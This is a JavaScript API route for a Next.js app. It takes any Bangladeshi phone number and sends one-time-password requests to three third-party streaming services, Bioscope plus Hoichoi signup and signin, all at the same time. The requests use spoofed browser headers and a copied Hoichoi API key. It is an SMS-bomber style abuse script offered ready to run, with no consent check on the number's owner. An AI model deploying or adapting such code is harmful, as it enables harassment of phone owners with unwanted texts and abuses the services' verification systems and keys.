// pages/api/send-otp.js

export default async function handler(req, res) {
  const number = req.query.number || req.query.phoneNumber;

  if (!number || number.length !== 11 || !number.startsWith("01")) {
    return res.status(400).json({
      error: "Please provide a valid Bangladeshi phone number (11 digits starting with '01').",
    });
  }

  const fullPhone = "+88" + number;

  const bioscopeRequest = fetch(
    "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
    {
      method: "POST",
      headers: {
        accept: "application/json",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        authorization: "",
        "content-type": "application/json",
        origin: "https://www.bioscopelive.com",
        priority: "u=1, i",
        referer: "https://www.bioscopelive.com/",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
      },
      body: JSON.stringify({ phone: fullPhone }),
    }
  );

  const hoichoiSignupRequest = fetch(
    "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-477f3707-1e17-d9cd-e31e-1135ee020dbc",
    {
      method: "POST",
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        origin: "https://www.hoichoi.tv",
        priority: "u=1, i",
        referer: "https://www.hoichoi.tv/",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef",
      },
      body: JSON.stringify({
        phoneNumber: fullPhone,
        requestType: "send",
        whatsappConsent: true,
      }),
    }
  );

  const hoichoiSigninRequest = fetch(
    "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-87b5fbdc-e54f-0d18-28c9-b22ce1929297",
    {
      method: "POST",
      headers: {
        accept: "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        origin: "https://www.hoichoi.tv",
        priority: "u=1, i",
        referer: "https://www.hoichoi.tv/",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef",
      },
      body: JSON.stringify({
        phoneNumber: fullPhone,
        requestType: "send",
        screenName: "signin",
      }),
    }
  );

  try {
    const [bioscopeRes, hoichoiSignupRes, hoichoiSigninRes] = await Promise.all([
      bioscopeRequest,
      hoichoiSignupRequest,
      hoichoiSigninRequest,
    ]);

    const bioscopeText = await bioscopeRes.text();
    const signupText = await hoichoiSignupRes.text();
    const signinText = await hoichoiSigninRes.text();

    return res.status(200).json({
      message: "OTP requests sent to all services",
      bioscope: bioscopeText,
      hoichoi_signup: signupText,
      hoichoi_signin: signinText,
    });
  } catch (err) {
    return res.status(500).json({
      error: "One or more API requests failed",
      details: err.message,
    });
  }
}
